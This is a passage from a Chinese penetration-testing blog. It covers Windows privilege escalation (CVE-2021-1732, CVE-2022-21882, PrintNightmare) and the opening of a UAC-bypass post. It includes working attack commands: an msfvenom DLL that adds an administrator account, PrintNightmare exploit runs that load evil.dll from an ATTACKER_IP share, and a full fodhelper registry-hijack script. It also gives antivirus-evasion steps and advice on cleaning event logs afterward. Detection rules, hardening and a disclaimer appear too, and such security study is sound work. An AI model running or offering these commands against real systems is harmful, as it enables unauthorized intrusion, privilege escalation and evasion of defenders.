+<h3 id="5-3-利用过程"><a href="#5-3-利用过程" class="headerlink" title="5.3 利用过程"></a>5.3 利用过程</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译好的Exploit（需自行编译以绕过杀软）</span></span><br><span class="line">CVE<span class="literal">-2021-1732</span>.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预期输出：</span></span><br><span class="line"><span class="comment"># [*] Target: Windows 10 20H2 (Build 19042)</span></span><br><span class="line"><span class="comment"># [+] Exploit Successfully!</span></span><br><span class="line"><span class="comment"># [+] Spawning SYSTEM shell...</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PoC 关键逻辑（伪代码）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 创建两个窗口，设置父窗口关系</span><br><span class="line">2. 通过 SetWindowsHookEx 挂载 WH_CALLWNDPROC 钩子</span><br><span class="line">3. 创建第三个窗口触发 WM_NCCALCSIZE</span><br><span class="line">4. 在钩子回调中调用 DestroyWindow，释放窗口</span><br><span class="line">5. 内核返回后继续使用已释放的 tagWND → UAF</span><br><span class="line">6. 利用堆喷（Heap Spray）技术占位被释放的内存</span><br><span class="line">7. 通过伪造 tagWND 结构读取 `gSharedInfo` 进而修改 token</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-防御"><a href="#5-4-防御" class="headerlink" title="5.4 防御"></a>5.4 防御</h3><ul>
+<li>安装2021年2月安全更新（KB4601319）</li>
+<li>EDR规则检测对<code>win32kfull.sys</code>的异常回调</li>
+</ul>
+<hr>
+<h2 id="六、CVE-2022-21882：Win32k-本地提权漏洞"><a href="#六、CVE-2022-21882：Win32k-本地提权漏洞" class="headerlink" title="六、CVE-2022-21882：Win32k 本地提权漏洞"></a>六、CVE-2022-21882：Win32k 本地提权漏洞</h2><h3 id="6-1-漏洞概述"><a href="#6-1-漏洞概述" class="headerlink" title="6.1 漏洞概述"></a>6.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：Windows 10 &#x2F; 11、Windows Server 2019&#x2F;2022</li>
+<li><strong>漏洞类型</strong>：win32k 中的输入验证不足导致的内存损坏</li>
+<li><strong>后果</strong>：通过竞态条件实现本地SYSTEM提权</li>
+<li><strong>公开利用</strong>：有PoC，利用难度中等偏高</li>
+</ul>
+<h3 id="6-2-技术分析"><a href="#6-2-技术分析" class="headerlink" title="6.2 技术分析"></a>6.2 技术分析</h3><p>漏洞位于 <code>win32kbase.sys</code> 的 <code>xxxMenuWindowProc</code> &#x2F; 菜单处理逻辑中。攻击者通过以下方式触发：</p>
+<ol>
+<li>并发地在不同线程中操作同一个菜单对象</li>
+<li>利用 <code>SetWindowLongPtr</code> 和 <code>EndMenu</code> 之间的竞态条件</li>
+<li>在窗口销毁后仍持有悬挂指针</li>
+<li>通过内存占位技术将悬挂指针重新指向可控数据</li>
+</ol>
+<p><strong>竞态窗口示意图：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">线程A: EndMenu → 释放菜单窗口内存</span><br><span class="line">线程B: SetWindowLongPtr → 在释放后仍向原地址写入数据</span><br><span class="line">       |</span><br><span class="line">       +→ 悬挂指针 → 内存占位 → 内核任意写入 → Token 替换</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-利用要点"><a href="#6-3-利用要点" class="headerlink" title="6.3 利用要点"></a>6.3 利用要点</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查是否易受攻击（安装 KB5010386 之前）</span></span><br><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.HotFixID <span class="operator">-eq</span> <span class="string">&quot;KB5010386&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如返回空，说明该补丁未安装，可能存在漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用难点：</strong></p>
+<ul>
+<li>竞态条件触发概率非100%，多次运行常见</li>
+<li>堆喷布局在不同版本的Windows上需调整</li>
+<li>虚拟机环境下的时机可能不同于物理机，需反复调试</li>
+</ul>
+<hr>
+<h2 id="七、PrintNightmare：CVE-2021-34527-Print-Spooler"><a href="#七、PrintNightmare：CVE-2021-34527-Print-Spooler" class="headerlink" title="七、PrintNightmare：CVE-2021-34527 (Print Spooler)"></a>七、PrintNightmare：CVE-2021-34527 (Print Spooler)</h2><h3 id="7-1-漏洞概述"><a href="#7-1-漏洞概述" class="headerlink" title="7.1 漏洞概述"></a>7.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：几乎所有受支持的 Windows 版本</li>
+<li><strong>漏洞类型</strong>：RpcAddPrinterDriverEx 未正确验证调用者权限</li>
+<li><strong>后果</strong>：低权限域用户可加载恶意驱动，远程代码执行+本地SYSTEM提权</li>
+<li><strong>CVSS v3.1</strong>：8.8 (High)</li>
+</ul>
+<p>PrintNightmare 实际上涵盖两个漏洞：</p>
+<ul>
+<li><strong>CVE-2021-34527</strong>：远程代码执行（RCE）角度</li>
+<li><strong>CVE-2021-1675</strong>：本地权限提升（LPE）角度</li>
+</ul>
+<p>两者指向同一根源——Print Spooler服务的<code>RpcAddPrinterDriverEx</code>函数没有严格执行驱动签名与权限检查。</p>
+<h3 id="7-2-漏洞根因"><a href="#7-2-漏洞根因" class="headerlink" title="7.2 漏洞根因"></a>7.2 漏洞根因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 简化后的存在缺陷的逻辑</span></span><br><span class="line">RpcAddPrinterDriverEx(...)&#123;</span><br><span class="line">    <span class="comment">// 没有验证调用者是否为管理员</span></span><br><span class="line">    <span class="comment">// 没有充分验证驱动DLL的签名</span></span><br><span class="line">    <span class="keyword">if</span> (CopyDriverToSystem32() &amp;&amp; LoadDriverIntoSpooler())&#123;</span><br><span class="line">        <span class="comment">// 驱动在 SYSTEM 进程中加载并执行</span></span><br><span class="line">        <span class="comment">// 攻击者的恶意 DLL 获得 SYSTEM 权限代码执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，安装打印机驱动需要<code>SeLoadDriverPrivilege</code>（仅管理员和打印操作员拥有）。但该函数内部验证逻辑存在缺陷，使普通用户可以绕过此限制。</p>
+<h3 id="7-3-本地提权利用"><a href="#7-3-本地提权利用" class="headerlink" title="7.3 本地提权利用"></a>7.3 本地提权利用</h3><p><strong>检测是否受影响：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> <span class="literal">-Name</span> Spooler | <span class="built_in">Select-Object</span> Name, Status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 Point and Print 注册表设置</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;NoWarningNoElevationOnInstall&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用步骤：</strong></p>
+<ol>
+<li>生成恶意 DLL：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 msfvenom 生成</span></span><br><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;net user hacker Pass123! /add &amp;&amp; net localgroup administrators hacker /add&quot;</span> \</span><br><span class="line">         -f dll -o evil.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或用 Impacket 的 ntlmrelayx.py 生成</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用公开Exploit（Python版本）：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cube0x0 的 CVE-2021-1675 脚本</span></span><br><span class="line">python3 CVE-2021-1675.py <span class="string">&#x27;DOMAIN/user:password@DC_IP&#x27;</span> <span class="string">&#x27;\\ATTACKER_IP\share\evil.dll&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># calebstewart 的 CVE-2021-1675 (纯PowerShell远程利用版本)</span></span><br><span class="line">python3 printnightmare.py -dll evil.dll -target-ip 10.0.0.5 -username user -password pass</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>本地提权（仅需低权限用户）：</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过本地 Print Spooler RPC 触发</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\CVE<span class="literal">-2021-1675</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-Nightmare</span> <span class="literal">-DLL</span> <span class="string">&quot;C:\temp\adduser.dll&quot;</span> <span class="literal">-NewUser</span> <span class="string">&quot;pwned&quot;</span> <span class="literal">-NewPassword</span> <span class="string">&quot;Pass123!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-实际的坑（Field-Notes）"><a href="#7-4-实际的坑（Field-Notes）" class="headerlink" title="7.4 实际的坑（Field Notes）"></a>7.4 实际的坑（Field Notes）</h3><ul>
+<li><strong>Spooler服务必须运行</strong>：部分安全基线已禁用该服务，需检查<code>Spooler</code>服务状态</li>
+<li><strong>防病毒软件拦截</strong>：打印驱动复制到<code>C:\Windows\System32\spool\drivers\</code>时被AV删除</li>
+<li><strong>版本差异</strong>：公开脚本在不同Build上参数可能不同，Windows Server 2016&#x2F;2019&#x2F;2022需分别测试</li>
+<li><strong>日志痕迹</strong>：驱动安装过程会在<code>System</code>事件日志的<code>Microsoft-Windows-PrintService/Admin</code>下留下大量记录，事后清理需注意</li>
+<li><strong>多次利用冲突</strong>：驱动文件名重复会导致安装失败，使用随机命名并清理残留文件</li>
+</ul>
+<h3 id="7-5-修复与缓解"><a href="#7-5-修复与缓解" class="headerlink" title="7.5 修复与缓解"></a>7.5 修复与缓解</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时缓解：停止 Print Spooler 服务</span></span><br><span class="line"><span class="built_in">Stop-Service</span> Spooler <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-Service</span> Spooler <span class="literal">-StartupType</span> Disabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产环境推荐（组策略）：</span></span><br><span class="line"><span class="comment"># 计算机配置 → 管理模板 → 打印机</span></span><br><span class="line"><span class="comment"># &quot;限制指向并打印到这些服务器&quot; → 启用 → 安全服务器列表</span></span><br><span class="line"><span class="comment"># &quot;指向并打印限制&quot; → 启用 → &quot;仅显示安装新的连接的包和驱动程序时的警告和提升提示&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>微软补丁：KB5005010 + 后续累积更新。注意：微软发布了多个迭代补丁，原始的KB5005010并未完全修复所有攻击向量。</p>
+<hr>
+<h2 id="八、通用内核提权方法论总结"><a href="#八、通用内核提权方法论总结" class="headerlink" title="八、通用内核提权方法论总结"></a>八、通用内核提权方法论总结</h2><h3 id="8-1-流程总览"><a href="#8-1-流程总览" class="headerlink" title="8.1 流程总览"></a>8.1 流程总览</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">获得初始立足点 (user-level shell)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">信息收集 (systeminfo / Get-HotFix)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">补丁对比分析 (WES-NG / Watson / 手动)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">候选漏洞筛选 (EoP 类型 / 有公开Exploit)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">Exploit投递与编译 (免杀 / 架构匹配)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">执行提权 (Spawning SYSTEM shell)</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">持久化与横向移动</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-Exploit-选择决策树"><a href="#8-2-Exploit-选择决策树" class="headerlink" title="8.2 Exploit 选择决策树"></a>8.2 Exploit 选择决策树</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌─ 已知补丁缺失？── 是 ─→ 匹配公共Exploit</span><br><span class="line">│                        ├─ MS16-032 (Win7/2008R2)</span><br><span class="line">│                        ├─ CVE-2021-1732 (Win10 18H1-20H2)</span><br><span class="line">│                        ├─ CVE-2022-21882 (Win10/11)</span><br><span class="line">│                        └─ PrintNightmare (全版本)</span><br><span class="line">│</span><br><span class="line">└─ 无已知漏洞 ─→ 检查驱动运行状态</span><br><span class="line">                 ├─ 第三方可利用驱动？</span><br><span class="line">                 │   ├─ RTCore64.sys → DSE绕过</span><br><span class="line">                 │   ├─ Capcom.sys → 物理内存读写</span><br><span class="line">                 │   └─ ...</span><br><span class="line">                 └─ 自定义漏洞挖掘</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-免杀最低要求"><a href="#8-3-免杀最低要求" class="headerlink" title="8.3 免杀最低要求"></a>8.3 免杀最低要求</h3><p>针对内核Exploit的规避：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 重编译 → 改变编译时元数据的哈希</span><br><span class="line">2. 字符串混淆 → 避免 &quot;CVE-2021-1732&quot; &quot;Exploit&quot; 等静态特征</span><br><span class="line">3. API 动态解析 → 而非静态导入 CreateRemoteThread / WriteProcessMemory</span><br><span class="line">4. Shellcode 分离与加密 → AES/XOR 编码载荷，运行时解密</span><br><span class="line">5. 进程注入目标选择 → 避免注入到 C:\Windows\System32\ 下敏感进程（首选 svchost.exe / 低风险进程）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御视角：检测与加固"><a href="#九、防御视角：检测与加固" class="headerlink" title="九、防御视角：检测与加固"></a>九、防御视角：检测与加固</h2><h3 id="9-1-检测指标"><a href="#9-1-检测指标" class="headerlink" title="9.1 检测指标"></a>9.1 检测指标</h3><ul>
+<li>非管理员进程调用<code>AdjustTokenPrivileges</code>开启<code>SeDebugPrivilege</code></li>
+<li><code>win32kfull.sys</code> &#x2F; <code>win32kbase.sys</code> 中产生异常调用栈</li>
+<li><code>mscorsvw.exe</code> 或 <code>svchost.exe</code> 以外的进程加载打印机驱动DLL</li>
+<li>非签名驱动的<code>DeviceIoControl</code>高频调用</li>
+<li>短时间窗口内单一进程触发多个<code>SYSTEM</code>令牌打开操作</li>
+</ul>
+<h3 id="9-2-Sysmon-检测规则"><a href="#9-2-Sysmon-检测规则" class="headerlink" title="9.2 Sysmon 检测规则"></a>9.2 Sysmon 检测规则</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessAccess</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 检测非SYSTEM进程获取SYSTEM进程句柄 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GrantedAccess</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>0x1fffff<span class="tag">&lt;/<span class="name">GrantedAccess</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetImage</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span>lsass.exe<span class="tag">&lt;/<span class="name">TargetImage</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessAccess</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DriverLoad</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 检测未签名驱动加载 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Signature</span> <span class="attr">condition</span>=<span class="string">&quot;is&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">Signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">DriverLoad</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="9-3-系统加固建议"><a href="#9-3-系统加固建议" class="headerlink" title="9.3 系统加固建议"></a>9.3 系统加固建议</h3><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>效果</th>
+<th>副作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>及时安装安全更新</td>
+<td>阻止已知CVE</td>
+<td>无（正常运维成本）</td>
+</tr>
+<tr>
+<td>启用 Credential Guard</td>
+<td>保护 LSASS 内存</td>
+<td>部分应用兼容性问题</td>
+</tr>
+<tr>
+<td>禁用不必要的驱动（blocklist）</td>
+<td>阻止DSE绕过</td>
+<td>可能导致硬件外设失效</td>
+</tr>
+<tr>
+<td>启用 HVCI (Memory Integrity)</td>
+<td>防止内核内存篡改</td>
+<td>约5%性能开销，旧驱动兼容性</td>
+</tr>
+<tr>
+<td>AppLocker &#x2F; WDAC</td>
+<td>限制未授权代码执行</td>
+<td>管理成本高</td>
+</tr>
+<tr>
+<td>停止 Print Spooler 服务（非打印服务器）</td>
+<td>阻止PrintNightmare</td>
+<td>无法执行打印任务</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十、免责声明"><a href="#十、免责声明" class="headerlink" title="十、免责声明"></a>十、免责声明</h2><p><strong>重要法律声明：</strong> 本文所述技术与工具仅供安全研究、授权渗透测试及防御建设参考。未经系统所有者明确书面授权，在任意系统上执行提权操作均属违法行为，可能触犯《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）等相关法律法规。作者不承担任何因滥用本文信息导致的法律责任。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide">MSRC Security Update Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-1732">CVE-2021-1732 Detail - NVD</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/advisories/ZDI-22-257/">CVE-2022-21882 Analysis - ZDI</a></li>
+<li><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527 PrintNightmare - MSRC Advisory</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester - Next Generation (WES-NG)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson - Missing KB Enumeration</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Barakat/CVE-2019-16098">RTCore64.sys DSE Bypass Analysis</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">[cube0x0] CVE-2021-1675 PrintNightmare LPE</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-UAC-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Windows-privesc-UAC-bypass/" class="post-title-link" itemprop="url">Windows提权：UAC绕过技巧</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-15T08:00:00+08:00">2025-01-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="一、UAC-概述"><a href="#一、UAC-概述" class="headerlink" title="一、UAC 概述"></a>一、UAC 概述</h2><p>用户账户控制（User Account Control，UAC）是 Windows 从 Vista 开始引入的核心安全机制。它将管理员权限请求隔离，要求用户通过弹窗确认提权。UAC 将用户划分为标准用户和管理员批准模式（AAM），日常操作默认运行在标准上下文中。</p>
+<p>UAC 定义了四个完整性级别（Integrity Level）：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>值</th>
+<th>说明</th>
+<th>典型进程</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>System</td>
+<td>0x4000</td>
+<td>系统服务最高权限</td>
+<td>services.exe, lsass.exe</td>
+</tr>
+<tr>
+<td>High</td>
+<td>0x3000</td>
+<td>管理员完整权限</td>
+<td>mmc.exe (提权后)</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>0x2000</td>
+<td>标准用户默认级别</td>
+<td>explorer.exe, cmd.exe (普通)</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>0x1000</td>
+<td>沙箱限制环境</td>
+<td>IE Protected Mode</td>
+</tr>
+</tbody></table>
+<p>攻击者获得 Medium IL Shell 后需要绕过 UAC 提权到 High 级别才能执行管理操作。</p>
+<h2 id="二、UAC-通知级别与自动提升机制"><a href="#二、UAC-通知级别与自动提升机制" class="headerlink" title="二、UAC 通知级别与自动提升机制"></a>二、UAC 通知级别与自动提升机制</h2><p>Windows UAC 的四档通知级别：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>名称</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>始终通知</td>
+<td>任何系统更改都弹窗</td>
+</tr>
+<tr>
+<td>2</td>
+<td>默认</td>
+<td>程序修改系统时弹窗，桌面设置不弹窗</td>
+</tr>
+<tr>
+<td>3</td>
+<td>不降低亮度</td>
+<td>同级别2，但不切换安全桌面</td>
+</tr>
+<tr>
+<td>4</td>
+<td>从不通知</td>
+<td>完全关闭 UAC</td>
+</tr>
+</tbody></table>
+<p>默认级别下，Windows 有一组微软签名的白名单二进制，满足以下条件即可<strong>静默自动提升</strong>——不弹窗直接获得 High IL：</p>
+<ul>
+<li>位于 <code>%SystemRoot%\System32</code> 等受保护目录</li>
+<li>经 Microsoft 数字签名</li>
+<li>内嵌清单中标记 <code>autoElevate=&quot;true&quot;</code></li>
+</ul>
+<p>使用 sigcheck 验证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe -m C:\Windows\System32\fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、注册表劫持绕过"><a href="#三、注册表劫持绕过" class="headerlink" title="三、注册表劫持绕过"></a>三、注册表劫持绕过</h2><h3 id="3-1-fodhelper-exe"><a href="#3-1-fodhelper-exe" class="headerlink" title="3.1 fodhelper.exe"></a>3.1 fodhelper.exe</h3><p><code>fodhelper.exe</code>（Features On Demand Helper）是自动提升程序，启动时查询以下注册表路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\ms-settings\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<p>默认该路径不存在。攻击者创建此路径并写入恶意命令即可劫持执行流。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入注册表</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> <span class="literal">-Force</span> | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;(Default)&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings\shell\open\command&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;DelegateExecute&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;&quot;</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发提权</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Classes\ms-settings&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>
+
+<p>C++ 实现简化版：</p>
